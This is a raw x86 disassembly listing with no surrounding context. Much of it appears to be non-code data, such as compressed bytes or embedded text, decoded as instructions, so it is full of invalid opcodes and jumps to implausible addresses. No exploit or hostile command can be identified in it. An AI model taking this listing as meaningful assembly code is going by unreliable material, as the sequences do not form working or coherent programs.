  41fbea:	cmc    
  41fbeb:	inc    ecx
  41fbec:	pop    eax
  41fbed:	adc    BYTE PTR ds:0x61e9b0c7,ch
  41fbf3:	push   0x8929b723
  41fbf8:	inc    DWORD PTR [eax]
  41fbfa:	js     0x41fc4c
  41fbfc:	add    BYTE PTR ds:[bx+si],al
  41fc00:	add    ah,dh
  41fc02:	mov    al,0x57
  41fc04:	(bad)  
  41fc05:	mov    edi,esp
  41fc07:	(bad)  
  41fc08:	or     ecx,DWORD PTR [ebx]
  41fc0a:	and    BYTE PTR [edx+0x4641e18],cl
  41fc10:	out    dx,eax
  41fc11:	xor    eax,0xf25a26ec
  41fc16:	nop
  41fc17:	xchg   edi,eax
  41fc18:	push   es
  41fc19:	adc    bl,BYTE PTR [edx-0x79]
  41fc1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc1d:	ret    
  41fc1e:	fadd   st,st(3)
  41fc20:	mov    esi,0x3bbe63
  41fc25:	add    BYTE PTR [ebx-0x64],ah
	...
  41fc34:	xlat   BYTE PTR ds:[bx]
  41fc36:	push   0x0
  41fc3b:	add    BYTE PTR [eax],al
  41fc3d:	add    BYTE PTR [eax],al
  41fc3f:	add    BYTE PTR [ebp+0x75],dh
  41fc42:	inc    edi
  41fc43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc44:	test   edi,edi
  41fc46:	fs out dx,eax
  41fc48:	sub    al,0x1d
  41fc4a:	cdq    
  41fc4b:	gs (bad) 
  41fc4d:	xor    DWORD PTR [eax+0x1],ebx
  41fc50:	push   ds
  41fc51:	mov    esi,0xb4613549
  41fc56:	or     BYTE PTR [eax],cl
  41fc58:	aas    
  41fc59:	jge    0x41fcd0
  41fc5b:	jne    0x41fc2a
  41fc5d:	jecxz  0x41fbee
  41fc5f:	push   0xffffff98
  41fc61:	test   edx,edi
  41fc63:	dec    edi
  41fc64:	js     0x41fcb1
  41fc66:	ja     0x41fbf4
  41fc68:	loopne 0x41fc94
  41fc6a:	or     BYTE PTR [ebx+0x5520320d],ch
  41fc70:	pop    ebp
  41fc71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc72:	jnp    0x41fc65
  41fc74:	fstp   QWORD PTR [edx+0x52]
  41fc77:	cmp    BYTE PTR [esi+0x75],ch
  41fc7a:	jne    0x41fbfe
  41fc7c:	jae    0x41fc13
  41fc7e:	jne    0x41fcf5
  41fc80:	mov    ch,0xb5
  41fc82:	push   0x80940075
  41fc87:	push   ds
  41fc88:	test   DWORD PTR [edx],ebp
  41fc8a:	dec    eax
  41fc8b:	dec    ebp
  41fc8c:	dec    eax
  41fc8d:	js     0x41fc27
  41fc8f:	sbb    al,0x4d
  41fc91:	or     eax,0x3f488819
  41fc96:	push   ecx
  41fc97:	mov    ds:0x2bf20c2c,al
  41fc9c:	push   0x0
  41fc9e:	add    BYTE PTR [eax],al
  41fca0:	(bad)  
  41fca1:	jl     0x41fca3
  41fca3:	add    BYTE PTR [edi+edx*4+0x6a000000],cl
  41fcaa:	push   0x6a
  41fcac:	push   0x6a
  41fcae:	push   0x6a
  41fcb0:	push   0x6a
  41fcb2:	ret    
  41fcb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcb4:	outs   dx,DWORD PTR ds:[esi]
  41fcb5:	loope  0x41fc58
  41fcb7:	arpl   WORD PTR [edx-0x45],cx
  41fcba:	sub    al,BYTE PTR [ecx]
  41fcbc:	rcl    DWORD PTR [ecx],cl
  41fcbe:	loop   0x41fc9b
  41fcc0:	cmp    BYTE PTR [ebp+0x6cc6d163],dl
  41fcc6:	into   
  41fcc7:	inc    esi
  41fcc8:	ja     0x41fcaf
  41fcca:	call   0xe92ae5b7
  41fccf:	call   0x12ae5bc
  41fcd4:	add    BYTE PTR ds:0xa0ca90,al
  41fcda:	add    BYTE PTR [ecx-0x28a709e],dh
  41fce0:	push   ecx
  41fce1:	or     BYTE PTR [edx+edx*4],bl
  41fce4:	int    0x93
  41fce6:	push   0x58
  41fce8:	pop    es
  41fce9:	xor    DWORD PTR [ecx+0x3f],eax
  41fcec:	mov    edx,esp
  41fcee:	jno    0x41fc72
  41fcf0:	in     eax,0x4d
  41fcf2:	mov    ?,edi
  41fcf4:	jnp    0x41fcc9
  41fcf6:	fisub  DWORD PTR [ecx-0x21]
  41fcf9:	pop    es
  41fcfa:	aas    
  41fcfb:	push   esi
  41fcfc:	mov    esi,0xab0000f2
  41fd01:	add    eax,0xee6d0000
  41fd06:	cmp    al,BYTE PTR [eax]
  41fd08:	(bad)  
  41fd09:	call   0x4eabcd92
  41fd0e:	xchg   ebp,eax
  41fd0f:	gs loop 0x41fca9
  41fd12:	(bad)  
  41fd13:	test   al,0x6a
  41fd15:	stos   DWORD PTR es:[edi],eax
  41fd16:	xchg   BYTE PTR [ecx-0x448ba590],al
  41fd1c:	mov    esp,0x998b68ed
  41fd21:	(bad)  
  41fd22:	(bad)  
  41fd23:	(bad)  
  41fd24:	jp     0x41fd25
  41fd26:	pop    es
  41fd27:	jae    0x41fd2e
  41fd29:	repz test BYTE PTR [esi-0x19],0x33
  41fd2e:	mov    ds:0x7685313,al
  41fd33:	cwde   
  41fd34:	fadd   DWORD PTR [eax-0x6e]
  41fd37:	stos   BYTE PTR es:[edi],al
  41fd38:	pop    ebx
  41fd39:	scas   al,BYTE PTR es:[edi]
  41fd3a:	and    DWORD PTR [edx+esi*8+0x235b5557],ecx
  41fd41:	(bad)  
  41fd42:	dec    ecx
  41fd44:	out    0xb2,eax
  41fd46:	(bad)  
  41fd47:	(bad)  
  41fd48:	dec    DWORD PTR [ebp-0x72727273]
  41fd4e:	lea    ecx,[ebp-0x52267273]
  41fd54:	mov    eax,0x0
  41fd59:	add    BYTE PTR [eax],al
  41fd5b:	add    BYTE PTR [eax],ah
  41fd5d:	jo     0x41fdd2
  41fd5f:	cs data16 das 
  41fd62:	ins    DWORD PTR es:[edi],dx
  41fd63:	and    BYTE PTR [edi],ch
  41fd65:	gs ins DWORD PTR es:[edi],dx
  41fd67:	imul   ebp,DWORD PTR [ebp+0xa],0x756d0a69
  41fd6e:	imul   esp,DWORD PTR gs:[edx+0x65],0x664e720d
  41fd76:	outs   dx,DWORD PTR ds:[esi]
  41fd77:	and    BYTE PTR [esi],ch
  41fd79:	push   ebx
  41fd7a:	jae    0x41fd9c
  41fd7c:	inc    ebx
  41fd7d:	jae    0x41fde3
  41fd7f:	jae    0x41fde6
  41fd81:	push   ebx
  41fd82:	outs   dx,BYTE PTR ds:[esi]
  41fd83:	cs cs je 0x41fdec
  41fd87:	gs gs gs cs or eax,0x6f6d6f76
  41fd90:	ins    BYTE PTR es:[edi],dx
  41fd91:	jae    0x41fdf5
  41fd93:	ds inc ebp
  41fd95:	outs   dx,DWORD PTR ds:[esi]
  41fd96:	bound  esp,QWORD PTR [edx+0x53]
  41fd99:	outs   dx,BYTE PTR ds:[esi]
  41fd9a:	bound  esi,QWORD PTR [edx+0x74]
  41fd9d:	cs inc ecx
  41fd9f:	ins    DWORD PTR es:[edi],dx
  41fda0:	and    BYTE PTR [ebp+0x53],ah
  41fda3:	gs push ebx
  41fda5:	and    BYTE PTR [ebx+0x65],dh
  41fda8:	inc    ecx
  41fda9:	add    BYTE PTR [eax],al
  41fdab:	or     BYTE PTR [eax],cl
  41fdad:	mov    ds:0x311c64da,al
  41fdb2:	pop    eax
  41fdb3:	pop    esp
  41fdb4:	lahf   
  41fdb5:	push   es
  41fdb6:	fst    DWORD PTR [ebp-0x70]
  41fdb9:	xor    eax,0x619ec38f
  41fdbe:	xor    DWORD PTR [edi+0x47],eax
  41fdc1:	mov    ah,0xd3
  41fdc3:	mov    dh,0x20
  41fdc5:	or     BYTE PTR [eax],cl
  41fdc7:	sbb    ax,0x808
  41fdcb:	pop    esp
  41fdcc:	lods   eax,DWORD PTR ds:[esi]
  41fdcd:	or     BYTE PTR [eax],cl
  41fdcf:	sub    DWORD PTR [edx],edi
  41fdd1:	xadd   BYTE PTR [edi-0x11994365],cl
  41fdd8:	mov    edx,0x1adf753
  41fddd:	lahf   
  41fdde:	pop    edi
  41fddf:	in     al,dx
  41fde0:	sub    ebx,DWORD PTR [edi-0x1dcea6a8]
  41fde6:	or     al,0x8
  41fde8:	mov    esp,DWORD PTR [edi-0x6e]
  41fdeb:	idiv   DWORD PTR [esi-0x75]
  41fdee:	mov    ecx,DWORD PTR [ebx+0x1610f299]
  41fdf4:	std    
  41fdf5:	leave  
  41fdf6:	fild   QWORD PTR [ebx+0x48]
  41fdf9:	cmp    al,0xb0
  41fdfb:	loopne 0x41fdce
  41fdfd:	sub    bh,BYTE PTR [ebp+0x5e96fc51]
  41fe03:	jmp    0x1824eecf
  41fe08:	imul   ebp,esi,0x8485ac80
  41fe0e:	call   0x33ce84d2
  41fe13:	mov    ecx,DWORD PTR [ebx-0x7474af0a]
  41fe19:	mov    eax,DWORD PTR [eax]
	...
  41fe23:	push   0x8b8bc0c1
  41fe28:	mov    ecx,DWORD PTR [ebx-0x74747475]
  41fe2e:	mov    ecx,DWORD PTR [ebx-0x70f83375]
  41fe34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe35:	loopne 0x41fdcd
  41fe37:	mov    ds:0xa223eed6,al
  41fe3c:	call   DWORD PTR [ecx+0x6a]
  41fe3f:	pop    ebx
  41fe40:	(bad)  
  41fe41:	ret    0x7c84
  41fe44:	rcr    BYTE PTR [edx-0x745597e8],cl
  41fe4a:	mov    esp,DWORD PTR [edx-0x5d]
  41fe4d:	adc    cl,BYTE PTR [ebx]
  41fe4f:	push   ds
  41fe50:	sbb    esp,DWORD PTR [ecx+0x7d]
  41fe53:	in     al,dx
  41fe54:	push   ecx
  41fe55:	xchg   ebp,eax
  41fe56:	or     ebp,DWORD PTR [ecx+0x64]
  41fe59:	addr16 ret 
  41fe5b:	and    eax,0xa0bdfe95
  41fe61:	mov    cl,0xd
  41fe63:	stos   BYTE PTR es:[edi],al
  41fe64:	xor    eax,0x8b79d02f
  41fe69:	mov    esp,DWORD PTR [edx-0x7474d7dd]
  41fe6f:	cmc    
  41fe70:	xchg   ecx,eax
  41fe71:	dec    edi
  41fe72:	mov    esi,DWORD PTR [ebp-0x24]
  41fe75:	das    
  41fe76:	cmp    eax,0x8d543c73
  41fe7b:	lods   al,BYTE PTR ds:[esi]
  41fe7c:	or     eax,0x385cfda
  41fe81:	inc    esi
  41fe82:	adc    al,0x68
  41fe84:	nop
  41fe85:	retf   
  41fe86:	cmp    eax,edx
  41fe88:	fwait
  41fe89:	jmp    0x75b7e4f0
  41fe8e:	jne    0x41fe23
  41fe90:	jl     0x41ff07
  41fe92:	jne    0x41fe70
  41fe94:	pop    ds
  41fe95:	jne    0x41ff0c
  41fe97:	jne    0x41fe26
  41fe99:	lea    ecx,[ebp-0x72727273]
  41fe9f:	lea    ecx,[ebp-0x42ba08b6]
  41fea5:	inc    edx
  41fea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fea7:	jbe    0x41fe82
  41fea9:	xor    BYTE PTR [ebp-0x2de05a7],bh
  41feaf:	pop    eax
  41feb0:	shr    BYTE PTR [ecx+0xd],cl
  41feb3:	mov    ebx,0x9075c333
  41feb8:	or     ch,al
  41feba:	call   0xe92ae7a7
  41febf:	call   0x42e7ac
  41fec4:	ret    
  41fec5:	(bad)  
  41fec6:	jae    0x41ff16
  41fec8:	add    BYTE PTR [eax],al
  41feca:	fwait
  41fecb:	test   al,0x1c
  41fecd:	in     eax,dx
  41fece:	call   0xc51e0a68
  41fed3:	inc    ebp
  41fed4:	mov    ebp,0xa92f3323
  41fed9:	mov    al,ds:0x5aec8ec8
  41fede:	adc    eax,0x10da5889
  41fee3:	addr16 push ecx
  41fee5:	xor    DWORD PTR [edi-0x18],esp
  41fee8:	xor    BYTE PTR [ebp+0xb1f54c],ah
  41feee:	add    BYTE PTR [ecx-0x29ffff6a],bh
  41fef4:	repz loope 0x41fef7
  41fef7:	call   FWORD PTR [edx-0xf5daa94]
  41fefd:	pop    ebp
  41fefe:	cld    
  41feff:	scas   al,BYTE PTR es:[edi]
  41ff00:	pusha  
  41ff01:	jae    0x41fe9b
  41ff03:	das    
  41ff04:	and    eax,0xf84a921a
  41ff09:	adc    DWORD PTR [ebp+0x49],ebx
  41ff0c:	sub    edi,DWORD PTR [ebp-0x59]
  41ff0f:	sar    edi,1
  41ff11:	(bad)  
  41ff12:	(bad)  
  41ff13:	mov    ecx,0xb5a75da7
  41ff18:	test   eax,0x928e4e7f
  41ff1d:	sbb    ebp,DWORD PTR [edx-0xe35273e]
  41ff23:	mov    dl,0x55
  41ff25:	add    DWORD PTR [esi],ebx
  41ff27:	ss xchg esp,eax
  41ff29:	xlat   BYTE PTR ds:[ebx]
  41ff2a:	gs dec edx
  41ff2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff2d:	lea    ecx,[ecx+0x42ffff97]
  41ff33:	jo     0x41ff53
  41ff35:	(bad)  
  41ff36:	(bad)  
  41ff37:	inc    DWORD PTR [eax]
	...
  41ff41:	push   0xfe8d
  41ff46:	add    BYTE PTR [eax],al
  41ff48:	add    BYTE PTR [eax],al
  41ff4a:	add    BYTE PTR [eax],al
  41ff4c:	add    BYTE PTR [ebp-0x5d002273],cl
  41ff52:	push   0xf
  41ff54:	inc    ebx
  41ff55:	mov    ch,0xc
  41ff57:	jae    0x41feef
  41ff59:	arpl   WORD PTR [esi-0x3e41f048],si
  41ff5f:	sub    ebp,DWORD PTR [esi+ebp*2+0x66395f2a]
  41ff66:	retf   
  41ff67:	lea    ecx,[ebp-0x727250af]
  41ff6d:	aas    
  41ff6e:	push   ecx
  41ff6f:	lea    ecx,[ebp-0x13c1fa51]
  41ff75:	push   edi
  41ff76:	fsub   QWORD PTR [eax]
  41ff78:	js     0x41ff3c
  41ff7a:	push   ecx
  41ff7b:	dec    edi
  41ff7c:	imul   esp,DWORD PTR [edi-0x68816b4b],0x6d
  41ff83:	rol    esp,1
  41ff85:	and    eax,0x8dc31510
  41ff8a:	xor    DWORD PTR [ecx+0x6],0x6a
  41ff8e:	int3   
  41ff8f:	add    DWORD PTR [ebx+0x1586f383],0x34
  41ff96:	jg     0x41ff26
  41ff98:	push   edi
  41ff99:	dec    ebp
  41ff9a:	out    0xe8,eax
  41ff9c:	fisub  DWORD PTR [bp+di-0x4460]
  41ffa1:	out    dx,eax
  41ffa2:	push   esp
  41ffa3:	dec    ebx
  41ffa4:	dec    edx
  41ffa5:	jle    0x41ffe6
  41ffa7:	shl    BYTE PTR [ecx],cl
  41ffa9:	cmp    edx,ebp
  41ffab:	dec    edi
  41ffac:	add    dh,BYTE PTR [ebp+0x62a17262]
  41ffb2:	jne    0x41ff51
  41ffb4:	fild   WORD PTR [ebx-0x7c9a837d]
  41ffba:	add    DWORD PTR [ebx+0xf0f0f0f],0xf
  41ffc1:	(bad)  
  41ffc2:	(bad)  
  41ffc3:	(bad)  
  41ffc4:	(bad)  
  41ffc6:	mov    BYTE PTR [ebx+0x50505050],dh
  41ffcc:	push   eax
  41ffcd:	push   eax
  41ffce:	push   eax
  41ffcf:	push   eax
  41ffd0:	push   eax
  41ffd1:	add    BYTE PTR [eax],al
  41ffd3:	and    bl,bh
  41ffd5:	mov    eax,0x24b37753
  41ffda:	ds retf 0xdf87
  41ffde:	fdivr  QWORD PTR [ebp+0x6f6d69ff]
  41ffe4:	ds ins DWORD PTR es:[edi],dx
  41ffe6:	cs je  0x420057
  41ffe9:	outs   dx,DWORD PTR ds:[esi]
  41ffea:	jb     0x420051
  41ffec:	cmp    dh,BYTE PTR [eax+eiz*1+0x6c]
  41fff0:	bound  esp,QWORD PTR [edi+0x20]
  41fff3:	jns    0x420015
  41fff5:	jne    0x420033
  41fff7:	jb     0x42005e
  41fff9:	outs   dx,DWORD PTR ds:[si]
  41fffb:	jo     0x420039
  41fffd:	gs or  eax,0x52206d20
  420003:	jae    0x420073
  420005:	cs ins DWORD PTR es:[edi],dx
  420007:	gs or  ah,BYTE PTR gs:[ecx+0x52]
  42000c:	arpl   WORD PTR gs:[bp+si+0x73],si
  420011:	or     eax,0x656e6765
  420016:	and    BYTE PTR [ebx+0x20],ah
  420019:	je     0x42007d
  42001b:	bound  esi,QWORD PTR [edx+0x62]
  42001e:	gs jae 0x420086
  420021:	cs push 0x3d3c3e74
  420027:	jo     0x420057
  420029:	and    BYTE PTR [eax],ah
  42002b:	gs or  eax,0x7272616e
  420031:	and    BYTE PTR [ebp+0x63],ah
  420034:	imul   esp,DWORD PTR [ebp+0x75],0x74616774
  42003b:	outs   dx,DWORD PTR ds:[esi]
  42003c:	and    BYTE PTR [eax+0x6d],dh
  42003f:	imul   ebp,DWORD PTR ds:[esi+0x73],0x436c3e0d
  420047:	ins    DWORD PTR es:[edi],dx
  420048:	jb     0x4200c0
  42004a:	imul   eax,DWORD PTR [edx+edi*1+0x73],0x696e6765
  420052:	ds inc esp
  420054:	cs gs or eax,0x20767263
  42005b:	mov    edx,DWORD PTR [eax+0x3a]
  42005e:	dec    edx
  42005f:	cmp    DWORD PTR [ebp*1+0x5c47d3],ebp
  420066:	add    BYTE PTR [ebx-0x1ef59c9a],dh
  42006c:	shl    BYTE PTR [edi+0x13],1
  42006f:	dec    edx
  420070:	mov    DWORD PTR [edx],edi
  420072:	xchg   esp,eax
  420073:	cdq    
  420074:	jo     0x42001d
  420076:	in     eax,0x8e
  420078:	inc    ebx
  420079:	jns    0x4200e3
  42007b:	stc    
  42007c:	shr    bh,1
  42007e:	xchg   ebx,eax
  42007f:	cmp    BYTE PTR [edx+0x7c],al
  420082:	lock sbb eax,DWORD PTR [eax]
  420085:	add    BYTE PTR [edi+0xa],bl
  420088:	ret    0x0
  42008b:	into   
  42008c:	cmp    DWORD PTR [eax+eax*1],0xd5513a00
  420093:	fidiv  DWORD PTR [eax-0x3898735d]
  420099:	nop    DWORD PTR [edx+ebx*2+0x2]
  42009e:	xchg   ebx,eax
  42009f:	stos   DWORD PTR es:[edi],eax
  4200a0:	add    eax,0x56bcb825
  4200a5:	jns    0x420077
  4200a7:	mov    bh,0x0
  4200a9:	add    BYTE PTR [eax],al
  4200ab:	and    eax,0xea0000c7
  4200b0:	scas   al,BYTE PTR es:[edi]
  4200b1:	add    BYTE PTR [eax],al
  4200b3:	add    BYTE PTR [ebp-0x72727273],cl
  4200b9:	lea    ecx,[ebp-0x31f7273]
  4200bf:	inc    esi
  4200c0:	mov    bl,0xa
  4200c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200c4:	ds (bad) 
  4200c6:	call   0xf20776be
  4200cb:	or     al,0x6a
  4200cd:	jnp    0x420115
  4200cf:	out    dx,al
  4200d0:	xor    ecx,edx
  4200d2:	add    al,0x49
  4200d4:	fwait
  4200d5:	inc    ebp
  4200d6:	inc    ebp
  4200d7:	inc    ebp
  4200d8:	inc    ebp
  4200d9:	inc    ebp
  4200da:	inc    ebp
  4200db:	inc    ebp
  4200dc:	inc    ebp
  4200dd:	inc    ebp
  4200de:	add    BYTE PTR [eax],al
  4200e0:	xor    DWORD PTR [esi],esi
  4200e2:	dec    edx
  4200e3:	jno    0x4200e5
  4200e5:	add    BYTE PTR [edi-0x29],ch
  4200e8:	push   cs
  4200e9:	inc    edi
  4200ea:	dec    esi
  4200eb:	cmp    al,0x7b
  4200ed:	rcr    BYTE PTR [edi+0x3d],1
  4200f0:	mov    bh,0xc4
  4200f2:	out    dx,eax
  4200f3:	test   ah,bl
  4200f5:	xchg   DWORD PTR [eax+0x19],edi
  4200f8:	jge    0x42016c
  4200fa:	push   esp
  4200fb:	aad    0x69
  4200fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200fe:	fisub  DWORD PTR [esi+0x65]
  420101:	cmc    
  420102:	or     eax,0x7d187c5a
  420107:	mov    ds:0xc0000f2,al
  42010c:	cmp    eax,0x41d40000
  420111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420112:	add    BYTE PTR [eax],al
  420114:	adc    BYTE PTR [edx+0x77],al
  420117:	xor    edi,ecx
  420119:	pop    ss
  42011a:	lea    ecx,[edi+ebp*4-0x3e]
  42011e:	xor    eax,0x8afd8a03
  420123:	inc    eax
  420124:	imul   eax
  420126:	jns    0x42010a
  420128:	adc    eax,0x1dd7fd
  42012d:	add    BYTE PTR [eax],al
  42012f:	jecxz  0x42014d
  420131:	test   ebp,eax
  420133:	and    ecx,ebx
  420135:	test   DWORD PTR [edx-0x39dfb2e1],esi
  42013b:	xor    eax,0x408cb32
  420140:	imul   DWORD PTR [ebx+0x37]
  420143:	ds sbb esi,ebp
  420146:	imul   edx,ecx,0x43
  420149:	imul   eax,DWORD PTR [ebx-0xaffff4b],0xb8fc
  420153:	add    bh,bh
  420155:	(bad)  
  420156:	(bad)  
  420157:	(bad)  
  420158:	(bad)  
  420159:	(bad)  
  42015a:	(bad)  
  42015b:	(bad)  
  42015c:	(bad)  
  42015d:	cmp    al,0xf6
  42015f:	pop    ecx
  420160:	(bad)  
  420161:	(bad)  
  420162:	(bad)  
  420163:	(bad)  
  420164:	(bad)  
  420165:	(bad)  
  420166:	(bad)  
  420167:	(bad)  
  420168:	inc    DWORD PTR [ebp+0x45]
  42016b:	test   BYTE PTR [ebx],ch
  42016d:	test   BYTE PTR [eax-0x610065cc],0xfe
  420174:	mov    es,esp
  420176:	mov    ecx,DWORD PTR [ebp+0x1d]
  420179:	pop    ebx
  42017a:	(bad)  
  42017b:	repz or DWORD PTR [ecx+eiz*4],ebp
  42017f:	in     eax,dx
  420180:	out    dx,eax
  420181:	rcl    DWORD PTR ds:0x7a54545,cl
  420187:	inc    ebp
  420188:	inc    ebp
  420189:	mov    dh,0x4e
  42018b:	inc    ebp
  42018c:	inc    ebp
  42018d:	push   ds
  42018e:	push   esp
  42018f:	pop    esi
  420190:	fdivr  DWORD PTR [ebx]
  420192:	or     BYTE PTR [esp+eax*2+0x63],al
  420196:	loopne 0x42012d
  420198:	fcomp  DWORD PTR es:[ecx-0x5e24fe61]
  42019f:	mov    ds:0x68dee7b6,al
  4201a4:	mov    eax,0x5b32ff45
  4201a9:	lods   al,BYTE PTR ds:[esi]
  4201aa:	pusha  
  4201ab:	(bad)  
  4201ac:	(bad)  
  4201ad:	jmp    DWORD PTR [ebp-0x67]
  4201b0:	jo     0x4201bb
  4201b2:	sar    DWORD PTR [eax-0x54],cl
  4201b5:	push   cs
  4201b6:	mov    dh,0xd1
  4201b8:	out    0x63,al
  4201ba:	pop    ebp
  4201bb:	les    eax,FWORD PTR [eax-0x8]
  4201be:	mov    cl,BYTE PTR [esi+edx*4]
  4201c1:	jmp    0x197c991c
  4201c6:	test   BYTE PTR [ebx],dh
  4201c8:	rcr    al,cl
  4201ca:	jle    0x4201b9
  4201cc:	(bad)  
  4201cd:	int    0x8
  4201cf:	jne    0x4201c0
  4201d1:	(bad)  
  4201d2:	dec    DWORD PTR [ebx]
  4201d4:	aad    0xff
  4201d6:	(bad)  
  4201d7:	push   DWORD PTR [ebp+0x75]
  4201da:	jne    0x420251
  4201dc:	jne    0x420253
  4201de:	jne    0x420255
  4201e0:	jne    0x420211
  4201e2:	xchg   ecx,eax
  4201e3:	add    BYTE PTR [eax],0x0
  4201e6:	add    BYTE PTR [eax],al
  4201e8:	add    BYTE PTR [eax],al
  4201ea:	add    BYTE PTR [eax],al
  4201ec:	add    BYTE PTR [ebx],dh
  4201ee:	xor    ebp,DWORD PTR [ecx-0x1a]
  4201f1:	out    dx,al
  4201f2:	mov    esi,0x8f456978
  4201f7:	(bad)  
  4201f8:	(bad)
  4201fc:	mov    es,edx
  4201fe:	adc    al,0xa9
  420200:	jge    0x42022f
  420202:	push   edi
  420203:	out    dx,al
  420204:	popa   
  420205:	sub    ebx,DWORD PTR [ebx+0x33]
  420208:	xor    ecx,DWORD PTR [edx+0xaafd130]
  42020e:	jecxz  0x4201ce
  420210:	push   edi
  420211:	push   ecx
  420212:	test   ebp,ebp
  420214:	ror    DWORD PTR [ebx],1
  420216:	stos   DWORD PTR es:[edi],eax
  420217:	cs inc eax
  420219:	xor    al,0xa3
  42021b:	mov    ah,0xb2
  42021d:	sbb    BYTE PTR [edi+0x4ed7a0d6],al
  420223:	cs pop ss
  420225:	(bad)  
  420226:	xor    esi,DWORD PTR [ebx]
  420228:	loope  0x420200
  42022a:	jg     0x42025f
  42022c:	xor    ebp,DWORD PTR [eax+0x338214]
  420232:	jbe    0x4201c2
  420234:	adc    ecx,ebx
  420236:	xchg   edx,eax
  420237:	(bad)  
  420238:	out    dx,al
  420239:	and    ch,BYTE PTR [esi+0x20c4e404]
  42023f:	pop    ebp
  420240:	ret    
  420241:	sub    eax,0xbf58758
  420246:	pop    edx
  420247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420248:	mov    dh,0x75
  42024a:	add    BYTE PTR [eax],al
  42024c:	add    BYTE PTR [edx-0x50],ch
  42024f:	add    BYTE PTR [eax],al
  420251:	shl    BYTE PTR [esi],cl
  420253:	add    BYTE PTR [eax],al
  420255:	add    BYTE PTR [ebx-0x74747475],cl
  42025b:	mov    ecx,DWORD PTR [ebx+0x28138b8b]
  420261:	ins    BYTE PTR es:[edi],dx
  420262:	ret    0xc252
  420265:	data16 adc al,0x2
  420268:	adc    eax,0xe9c1e729
  42026d:	pop    ebx
  42026e:	out    0xca,al
  420270:	dec    esi
  420271:	in     eax,0x4c
  420273:	test   al,0xe0
  420275:	aam    0x22
	...
  42027f:	add    BYTE PTR [eax],al
  420281:	add    BYTE PTR [esi+0x63],ch
  420284:	sahf   
  420285:	test   al,0x0
  420287:	add    al,al
  420289:	lods   eax,DWORD PTR ds:[esi]
  42028a:	pop    ss
  42028b:	xor    bh,bh
  42028d:	or     al,0x23
  42028f:	adc    al,bh
  420291:	lods   eax,DWORD PTR ds:[esi]
  420292:	and    BYTE PTR [edi-0x59325370],bh
  420298:	inc    edi
  420299:	add    eax,0x42aa1ab7
  42029e:	jle    0x4202cb
  4202a0:	or     BYTE PTR [ebx],0x97
  4202a3:	rcr    DWORD PTR [eax+ebx*8],1
  4202a6:	push   ecx
  4202a7:	sbb    esi,eax
  4202a9:	push   edx
  4202aa:	add    BYTE PTR gs:[eax],al
  4202ad:	shl    DWORD PTR [ecx+0x0],0x0
  4202b1:	inc    ebp
  4202b2:	out    0xa6,al
  4202b4:	add    ah,cl
  4202b6:	(bad)  
  4202b7:	aad    0x6d
  4202b9:	into   
  4202ba:	aaa    
  4202bb:	cmp    dh,BYTE PTR [esi+0x43ad121f]
  4202c1:	mov    ch,BYTE PTR [edi-0x1d]
  4202c4:	add    BYTE PTR [edx],al
  4202c6:	and    eax,0x56c2a38d
  4202cb:	xor    BYTE PTR cs:[eax+0x69cccccc],ah
  4202d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202d4:	cmp    bl,0x55
  4202d7:	lods   al,BYTE PTR ds:[esi]
  4202d8:	mov    esi,0x43d6b1e4
  4202dd:	mov    edi,0xcb7371d3
  4202e2:	mov    ah,0x9f
  4202e4:	imul   ebx,DWORD PTR [ebp-0x1e],0xffffffac
  4202e8:	call   0xcc9d:0x367a285a
  4202ef:	int3   
  4202f0:	jbe    0x420279
  4202f2:	(bad)  
  4202f4:	int3   
  4202f5:	int3   
  4202f6:	lea    ecx,[ebp-0x72727273]
  4202fc:	lea    ecx,[ebp+0x2f474f8d]
  420302:	add    al,0x4
  420304:	add    al,0x4
  420306:	add    al,0x4
  420308:	add    al,0x4
  42030a:	add    al,0xc0
  42030c:	rcr    al,0x6e
  42030f:	mov    BYTE PTR [ebp+edx*1+0x123ca8bc],al
  420316:	adc    esp,DWORD PTR es:[edi]
  420319:	jo     0x420319
  42031b:	pop    edi
  42031c:	shr    BYTE PTR [ecx+0x40fdc767],cl
  420322:	shl    dh,1
  420324:	sub    eax,0xca30c0c0
  420329:	rol    al,0x79
  42032c:	(bad)  
  42032d:	rol    al,0x42
  420330:	js     0x420399
  420332:	sub    al,0x1a
  420334:	xchg   DWORD PTR ds:0x4e26706b,edi
  42033a:	xchg   esp,eax
  42033b:	hlt    
  42033c:	aaa    
  42033d:	adc    al,0xeb
  42033f:	pop    es
  420340:	xlat   BYTE PTR ds:[ebx]
  420341:	mov    esp,0x2c08d8fe
  420346:	xchg   esi,eax
  420347:	sar    bh,0x1d
  42034a:	shl    DWORD PTR [ecx+0x62],0xff
  42034e:	(bad)  
  42034f:	(bad)  
  420350:	jmp    0xf2d0130b
  420355:	test   eax,0x86f3dd6c
  42035a:	jge    0x4202ee
  42035c:	xlat   BYTE PTR ds:[ebx]
  42035d:	mov    bl,0xda
  42035f:	inc    edi
  420360:	int    0xfb
  420362:	xor    esi,DWORD PTR [edx+0x1f]
  420365:	add    ch,BYTE PTR [ecx+ebx*4+0x45]
  420369:	pop    ss
  42036a:	xor    BYTE PTR [eax-0x80],dl
  42036d:	add    al,0xf9
  42036f:	add    BYTE PTR [edx+0x13],cl
  420372:	xchg   edi,edi
  420374:	dec    esp
  420376:	sub    edi,edi
  420378:	(bad)  
  420379:	inc    DWORD PTR [eax]
	...
  420383:	sbb    DWORD PTR [ebp-0x1d],edi
	...
  42038e:	add    BYTE PTR [eax],al
  420390:	add    BYTE PTR [edi],cl
  420392:	out    dx,al
  420393:	ins    BYTE PTR es:[edi],dx
  420394:	jbe    0x42034e
  420396:	push   ss
  420397:	cmp    BYTE PTR [edx+0x72a7e3c1],ah
  42039d:	inc    esi
  42039e:	inc    esi
  42039f:	inc    eax
  4203a0:	sbb    eax,0xaf4d3914
